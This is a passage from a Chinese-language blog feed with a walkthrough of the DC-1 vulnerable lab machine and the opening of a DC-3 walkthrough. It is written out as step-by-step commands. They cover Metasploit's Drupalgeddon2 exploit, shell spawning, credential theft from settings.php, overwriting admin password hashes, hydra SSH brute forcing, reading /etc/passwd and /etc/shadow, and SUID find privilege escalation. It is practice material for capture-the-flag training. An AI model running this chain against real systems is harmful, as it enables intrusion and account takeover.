src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png"></p><p><strong>gobuster常使用的命令和标志：</strong></p><ul><li><p>命令（模式）</p><p><strong>completion</strong>：为指定的shell生成自动完成脚本<br><strong>dir</strong>：使用目录&#x2F;文件枚举模式<br><strong>dns</strong>：使用DNS子域枚举模式<br><strong>fuzz</strong>：使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br><strong>gcs</strong>：使用gcs bucket枚举模式<br><strong>help</strong>：获取任何命令的帮助信息<br><strong>s3</strong>：使用aws bucket枚举模式<br><strong>tftp</strong>：使用TFTP枚举模式<br><strong>version</strong>：显示当前版本<br><strong>vhost</strong>：使用VHOST枚举模式（您很可能想在URL参数中使用IP地址）</p></li><li><p>标志（全局参数）</p><p><strong>–debug</strong>：启用调试输出<br><strong>–delay duration</strong>：每个线程在请求之间的等待时间（例如1500ms）<br><strong>-h, –help</strong>：获取gobuster的帮助信息<br><strong>–no-color</strong>：禁用彩色输出<br><strong>–no-error</strong>：不显示错误<br><strong>-z, –no-progress</strong>：不显示进度<br><strong>-o, –output string</strong>：写入结果的输出文件（默认为stdout）<br><strong>-p, –pattern string</strong>：包含替换模式的文件<br><strong>-q, –quiet</strong>：不打印横幅和其他无关信息<br><strong>-t, –threads int</strong>：并发线程的数量（默认为10）<br><strong>-v, –verbose</strong>：详细输出（错误）<br><strong>-w, –wordlist string</strong>：指向字典文件的路径。设置为-以使用STDIN。<br><strong>–wordlist-offset int</strong>：从字典文件中的指定位置恢复（默认为0）<br>（原文链接：<a href="https://blog.csdn.net/weixin_70137901/article/details/134613324%EF%BC%89">https://blog.csdn.net/weixin_70137901/article/details/134613324）</a></p></li><li><p>gobuster使用基本语法</p><p><strong>目录扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w 选择一个字典 -u 输入要扫描的网站 -x 扫描的文件类型 -t 线程数量<br></code></pre></td></tr></table></figure><p><strong>子域名扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d 域名 -w 字典<br></code></pre></td></tr></table></figure></li></ul><h2 id="Drupal-CMS漏洞查找"><a href="#Drupal-CMS漏洞查找" class="headerlink" title="Drupal CMS漏洞查找"></a>Drupal CMS漏洞查找</h2><p>使用Metasploit查询该CMS漏洞并进行测试。</p><table><thead><tr><th align="left">Metasploit是一款开源渗透测试框架，可以进行信息收集、漏洞扫描、漏洞利用和后渗透攻击。提供了Payload生成器用于生成各种类型的恶意代码，如shellcode、Trojan程序等。还可以通过编写脚本自动化渗透测试过程。</th></tr></thead></table><p>首先打开工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入命令：msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png" alt="img"></p><p>输入命令查找Drupal CMS漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png" alt="img"></p><p>根据查询结果，可以得知这个Drupal CMS框架还是有蛮多漏洞的。Rank表示漏洞等级。此处利用漏洞等级较高且时间最新的2018年的漏洞。</p><blockquote><p> exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png" alt="img"></p><p>查看该漏洞模块的参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png" alt="img"></p><p>其中，<code>Current Setting </code>是目前设置的内容，<code>Required</code>表示是否需要设置内容，yes为必须，no为可选。</p><p>然后可以看到有一个<code>RHOSTS</code>项目，重置HOST，设置为必须设置。因而接下来需要设置RHOSTS的内容，即攻击目标IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.129<br></code></pre></td></tr></table></figure><p>然后再查看一下模块的参数，确认设置完成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png" alt="img"></p><p>然后执行run&#x2F;exploit命令开始攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run/exploit<br></code></pre></td></tr></table></figure><p>出现如下提示信息表明攻击成功！</p><p><code>Meterpreter session 1 opened </code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png" alt="img"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>利用漏洞攻击目标主机成功之后就可以Getshell获取权限了。</p><h3 id="1、获取普通shell"><a href="#1、获取普通shell" class="headerlink" title="1、获取普通shell"></a>1、获取普通shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png" alt="img"></p><p>然后在上述光标处输入并执行ls命令，获取目标目录下的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png" alt="img"></p><p>通过执行命令可以判断所得到的权限级别：</p><blockquote><p>一般来说，对于用户类型的ID分配为：</p><p>①系统管理员id&#x3D;0；②普通用户id&#x3D;1~65535。</p><p>而且当所获取的权限为系统管理员权限时，执行 <code>whoami</code>显示的用户名是root。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png" alt="img"></p><p>显然，这里获取的权限是普通用户的权限。尽管只是普通权限， 但我们仍可以通过这些普通权限去获取别的信息。</p><p>- </p><p><strong>使用命令测试是否提权成功，就是切换用户到靶机用户，得到如下效果：</strong></p><p><strong>Pay：这个操作是必要的，不然会导致提权被迫失败。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 利用python的‘pty’模块来生成一个交互式的bash shell<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png" alt="img"></p><p>- </p><p>比如，使用cat命令看看flag1.txt文件（上述执行ls获得的目录列表文件之一）的文件内容是什么：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png" alt="img"></p><p>继而搜索其他flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name flag*<br></code></pre></td></tr></table></figure><p>结果显示只有flag1.txt了捏：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png" alt="img"></p><p>下一步要干什么呢？通过网路查询Drupal CMS的配置文件一般叫什么，以它为切入口。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png" alt="img"></p><p>经过查询得知，Drupal的配置文件一般叫settings.php，因而找出所有<code>*settings.php</code>文件出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png" alt="img"></p><p>一共找到了三个捏。根据文件名，第一个文件大概率是主题相关的，可以先查看后面两个文件。</p><blockquote><p>&#x2F;var&#x2F;www&#x2F;themes&#x2F;garland&#x2F;theme-settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;default.settings.php</p></blockquote><p>先查看第二个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png" alt="img"></p><p>直接就得到了数据库的相关信息，包括用户名和密码等。与此同时也得到了flag2的相关提示信息。</p><p>继续查看第三个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/default.settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png" alt="img"></p><p>多为注释，没啥实质性有用的信息。</p><p>根据第二个文件获取到的数据库相关信息，尝试登陆数据库，查看其中的数据。并尝试获取登陆的<code>用户名</code>和<code>密码</code>：</p><p>- </p><p>使用MYSQL命令之前需要先确保它的服务已经开启，并且已经启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status mysql    // 检查状态<br>systemctl start mysql     // 启动服务<br></code></pre></td></tr></table></figure><p>未开启服务的时候返回的响应信息如果指向的是MariaDB服务未启动。</p><p>使用命令设置MariaDB自启动：（系统下次启动时就会自动启动它）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure><p>- </p><p>尝试执行数据库登陆命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure><p>用户名是<code>dbuser</code></p><p>密码是<code>R0ck3t</code></p><p>返回响应信息如下，表示成功登陆了数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png" alt="img"></p><p>查看数据库的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show databases;<br>（分号是必须要加的）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png" alt="img"></p><p>有两个数据库，一个是记录当前数据库系统中所有元数据的记录文件，另一个是drupaldb数据库。</p><p>接下来查看数据库中的表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br><br>show tables;<br><br></code></pre></td></tr></table></figure><p>注意，分号也是需要的哦。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png" alt="img"></p><p>根据表名，我们可以发现数据库中含有一个表名为<code>user</code>的表，里面应该会有一些信息。</p><p>接下来查看该表的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png" alt="img"></p><p>其中的name应该表示的是用户名，pass表示的是对应的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png" alt="img"></p><p>但是细看pass，都是经过加密保护的数据：</p><blockquote><p>数据库中的密码一般采用的是hash加密。因此关于数据库加密密码的破解可以通过一些hash加密脚本进行切入。</p></blockquote><p>输入命令：（需要先退出，切换为交互界面哦~）</p><p>退出后的切换命令：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p>查询得到的结果很多：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png" alt="img"></p><p>通过查看文件命名，可以发现存在一个名为：<code>password-hash.sh</code>的文件，初步判断其应该是我们要找的hash加密脚本。读取该脚本寻找其使用方法。</p><blockquote><p>.sh后缀的文件一般是shell脚本文件。用于在linux系统中执行一些自动化任务或者命令序列。</p></blockquote><p>读取加密脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/scripts/password-hash.sh<br></code></pre></td></tr></table></figure><p>得到结果（一些关键信息如下）：</p><p>比如，使用说明和帮助信息：支持‘–root’选项，用于将工作目录切换到drupal安装目录。所有的明文密码都必须使用双引号括起来。</p><p>“ One or more plan-text passwords enclosed by double quotes.”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png" alt="img"></p><p>得知这个信息之后，我们可以利用这个加密脚本中的加密方法构造一个已知用户名对应的对我们而言已知的新密码。进而替换users表格中的对象。</p><p>修改目标：将用户名为admin的密码修改为’admin‘</p><p>运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php /var/www/scripts/password-hash.sh admin<br></code></pre></td></tr></table></figure><p>注：该条命令的意思是，运行该.sh脚本，生成明文密码是“admin”的hash加密密码值。</p><p><strong>plain-pass</strong>：admin</p><p><strong>encrypt-hash-pass：</strong></p><p>$S$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png" alt="img"></p><p>接下来就是回到数据库中将用户名为“admin”的密码改为我们新生成的hash密码值，即修改admin用户的密码为’admin‘。</p><p>mysql -udbuser -pR0ck3t</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br>update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</span>&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span> or name=<span class="hljs-string">&quot;Fred&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png" alt="img"></p><p>验证是否成功修改，<code>select * from users；</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png" alt="img"></p><p>- </p><p>退出mysql命令行使用<code>exit</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png" alt="img"></p><p>- </p><p>使用”name：admin，pass：admin“去登陆目标ip网页。得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png" alt="img"></p><p>然后我们选择上方的”content“点击，查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png" alt="img"></p><p>发现有个”flag3“，点击，得到如下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png" alt="img"></p><p>访问文件<code>/etc/passwd</code>获取相关系统用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png" alt="img"></p><p>解释：&#x2F;etc&#x2F;passwd文件中的每条信息包含了多个字段，各个字段之间使用冒号分隔开来。</p><blockquote><p>显示字段的语法：</p><p>用户名：密码占位符（通常是’x‘）：用户ID（UID）：组ID（GID）：用户描述：家目录：登陆shell</p></blockquote><p>接下来尝试访问<code>/etc/shadow</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p>由结果发现，由于权限不足，文件访问遭到拒绝：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png" alt="image-20240619125252692"></p><p>解释：&#x2F;etc&#x2F;shadow文件一般用于存储系统用户的加密密码及其相关的安全设置，通常只有系统管理员可以访问。</p><blockquote><p>显示字段的语法：（各字段使用冒号分隔）</p><p>用户名：加密密码：上次密码更改日期：密码更改最短间隔：密码更改最长间隔：密码过期警告天数：账户失效日期：保留字段</p><p>其中，加密密码通常使用的是’bcrypt’’SHA-256’或’SHA-512’等强哈希算法加密。</p></blockquote><p>回看上述获取的系统用户信息，发现近开头处有一个名为<code>root</code>的用户（doge&#x2F;），尝试使用字典爆破，看看能不能直接同时拿到登陆数据和提权。</p><p>切换回kali的root用户，使用hydra进行密码字典爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>实际上，爆破的时间很长，而且，好像看不到结果（如下），所以想通过直接爆破root来获取登陆数据和实现提权是不大现实的。<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png" alt="img"></p><p>再看！近末尾处存在一个用户名为<code>flag4</code>的用户（为什么选中它就是！因为flag这个单词很熟，而且通常包含了关键信息）。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>很快地，就爆破出了这个用户的ssh登陆密码：</p><blockquote><p>flag4</p><p>orange</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png" alt="img"></p><blockquote><p>hydra（密码破解工具）使用语法：</p><p>hydra -l 单个用户名 -p 密码字典表 -e 超时重试次数 -t count -M file -T count1 -o outputfile -f pass1 -c t1 -w t2 -C t3 -R t4 -s 指定端口号 -x    -SuvVd46 其它选项 服务:&#x2F;&#x2F;服务：端口</p></blockquote><p>- </p><p><code>[-l LOGIN|-L FILE]</code>：指定单个用户名 <code>-l</code> 或从文件中读取用户名列表 <code>-L</code>。</p><p><code>[-p PASS|-P FILE]</code>：指定单个密码 <code>-p</code> 或从文件中读取密码列表 <code>-P</code>。</p><p><code>[-e ns]</code>：设置错误和超时的重试次数，默认为 5 次错误和 20 秒的超时。</p><p><code>[-t TASKS]</code>：同时运行的任务数，默认为 16。</p><p><code>[-M FILE]</code>：启用并行模式，从文件中读取主机列表。</p><p><code>[-T TASKS]</code>：每个主机并行任务数，默认为 16。</p><p><code>[-o FILE]</code>：将结果输出到文件。</p><p><code>[-f]</code>：强制使用指定的密码，即使它不工作。</p><p><code>[-c TIME]</code>：等待连接超时时间，默认为 30 秒。</p><p><code>[-w TIME]</code>：等待响应超时时间，默认为 30 秒。</p><p><code>[-C TIME]</code>：每个连接的间隔时间，默认为 0 秒。</p><p><code>[-R TIME]</code>：等待任务切换时间，默认为 0 秒。</p><p><code>[-s PORT]</code>：连接到指定端口，默认为服务的标准端口。</p><p><code>[-x MIN:MAX:CHARSET]</code>：使用指定的字符集生成密码。</p><p><code>[-SuvVd46]</code>：其他选项，例如静默模式 <code>-S</code>、详细输出 <code>-v</code>、非详细输出 <code>-V</code>、调试输出 <code>-d</code>、IPv6 支持 <code>-6</code> 等。</p><p><code>[service://server[:PORT][/OPT]]</code>：指定目标服务的协议、服务器地址和端口，以及可选的参数。</p><p>- </p><p>ok！登陆权限拿到！</p><p>返回靶机尝试登陆，发现能够成功以flag4用户的身份登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png" alt="img"></p><h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p>接下来进行提权，以获得更多有用的信息。</p><p>首先先使用<code>find</code>命令，查找具有SUID权限（拥有者&#x2F;管理者权限）的可执行二进制文件（通俗点理解就是命令，比如find这种）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>查找结果如下：</p><p>由查找结果可以发现，find命令也具有SUID权限，因而可以通过它实现提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png" alt="img"></p><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name index.php -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;<br></code></pre></td></tr></table></figure><p>解释：命令意思是，使用find命令，通过执行 “&#x2F;bin&#x2F;sh”文件来查找名为index.php的文件。其中，查找什么文件不重要，关键是使用具有<code>SUID权限</code>的命令去调用执行<code>-exec &quot;/bin/sh&quot;</code>。</p><p>（注意末尾的符号也需要！而且需要有个空格！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png" alt="img"></p><blockquote><p>&#x2F;bin&#x2F;sh文件：<br>是系统默认的命令行解释器，通常被称为’shell‘</p></blockquote><p>成功提权！此时也可以访问<code>/etc/shadow</code>（密码）文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png" alt="img"></p><p>结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DC1靶场攻打过程中使用到的相关关键操作技术：、</p><ul><li><p>首先先进行信息收集。使用<code>nmap</code>端口扫描收集开放端口信息。通过端口信息试图获取目标靶场的相关信息，比如所使用的框架等。</p></li><li><p>利用<code>msfconsole</code>寻找有关drupal CMS框架的漏洞，并利用漏洞重置<code>RHOSTS</code>字段值为目标靶机值，使用<code>run/exploit</code>命令执行。</p></li><li><p>获取shell，同样是通过<code>msfconsole</code>实现，输入<code>shell  -&gt;  ls</code>看是否成功列出目录文件，成功则表示get shell成功。输入命令<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>开启用户交互界面（即以靶机用户身份进行后续操作）</p></li><li><p>搜索靶机框架的配置文件名，搜索其下的所有相关配置文件，并<code>cat</code>查看文件内容，试图从中获取有用的信息。</p></li><li><p>获取数据库内容之后，使用命令<code>mysql -uName -pPassword</code>尝试登陆。</p></li><li><p>使用hydra进行密码爆破</p></li><li><p>提权，首先需要查找有SUID权限的命令，<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，然后执行<code>（SUID） / -name index.php -exec &quot;/bin/sh&quot; \;</code>进行提权。</p></li><li><p>检测权限属主的命令为<code>whoami和id</code></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/07/24/DC-3/"/>
    <url>/2024/07/24/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>首先，必须先确定测试机器（kali）和目标靶机处于同一个模式（这里使用NAT模式）。否则在kali端扫不出目标靶机的IP地址。</p><p>- </p><p>此外，在本次在虚拟机打开靶机的过程中，遇到了一个问题：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701215940440.png" alt="image-20240701215940440"></p><p>解决方法（亲测有用）：将CD&#x2F;DVD（IDE）选项的<code>IDE（D）</code>修改为<code>IDE 0：0</code>。</p><p><a href="https://developer.aliyun.com/article/1209515">https://developer.aliyun.com/article/1209515</a></p><p>- </p><p>然后通过开关靶机以及进行nmap网段扫描来确定靶机的IP地址。</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222633001.png" alt="image-20240701222633001"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222702232.png" alt="image-20240701222702232"></p><p>通过前后nmap扫描结果的对比，可以确认目标靶机的IP地址是：<code>192.168.204.132</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.132<br>nmap -sT -p- 192.168.204.132<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701224802419.png" alt="image-20240701224802419"></p><p>由检测结果可以看出，目标靶机开放的端口服务只有<code>80</code>端口（http协议）。接下来进行更加详细的端口扫描。</p><h3 id="详细端口扫描"><a href="#详细端口扫描" class="headerlink" title="详细端口扫描"></a>详细端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701230223132.png" alt="image-20240701230223132"></p><p>可以看到，其开放的80端口服务有http网页相关内容的信息。但除此之外没有其它有用的信息了。所以我们可以再进行nmap漏扫，尝试获取更多有价值的信息。</p><h3 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110519853.png" alt="image-20240702110519853"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110540612.png" alt="image-20240702110540612"></p><p>发现可能这个目标靶机网页可能存在着：</p><p><code>Joomla 中的SQL注入漏洞</code>：(SQL Injection Vulnerability)</p><blockquote><p> An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute aribitrary SQL commands via unspecified vectors.</p><p> 在Joomla中存在一个SQL注入漏洞，3.7版本在3.7.1之前它允许攻击者使用未指明的变量去执行任意SQL命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111339383.png" alt="image-20240702111339383"></p><p><code>DOS攻击漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111629174.png" alt="image-20240702111629174"></p><p><code>csrf漏洞</code>：</p><p><img 